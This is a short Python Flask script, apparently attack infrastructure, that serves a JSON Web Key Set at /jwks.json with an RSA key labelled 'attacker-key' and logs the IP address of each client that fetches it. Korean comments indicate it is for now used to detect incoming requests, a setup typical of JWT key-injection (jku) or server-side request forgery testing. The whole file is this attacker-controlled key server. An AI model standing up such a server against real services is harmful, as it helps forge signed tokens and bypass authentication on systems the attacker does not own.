from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route('/jwks.json')
def jwks():
    print("[+] /jwks.json 요청 감지:", request.remote_addr)
    return {
        "keys": [
            {
                "kty": "RSA",
                "kid": "attacker-key",
                "use": "sig",
                "alg": "RS256",
                "n": "54b1XuT3XuEeyZhKCuFefYioLIIWwV1oSEQm4ddjmLb8PZ83IN1DHpi7CgiPyzYveIIZKnZtsae6VeEdgrghW2c0tItfFlbAftYq0ng57poOh_SCTPtrhZufUvK4QjNTarDH1GlJNfNriPb08lHATH9mocLygAIIICoN27jBjWnqjo6qGrm1aPz2ctHDHGm-uo6XzvQOwpTdyBhsOhUg4xBVN_umVLa99oiMy6tr_kkb4jkxErgaTpJ2hzQWhx_6r271twgYJ1jla-sXlyggE51Ufodx6oKhz_syo46yk1m7aOMzxVDa9PW6CSbz9zjBS8VcerVunuBo44IAVZGyuQ",  # 지금은 n 진짜 값 없어도 됨 (요청 감지용)
                "e": "AQAB"
            }
        ]
    }

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5010)
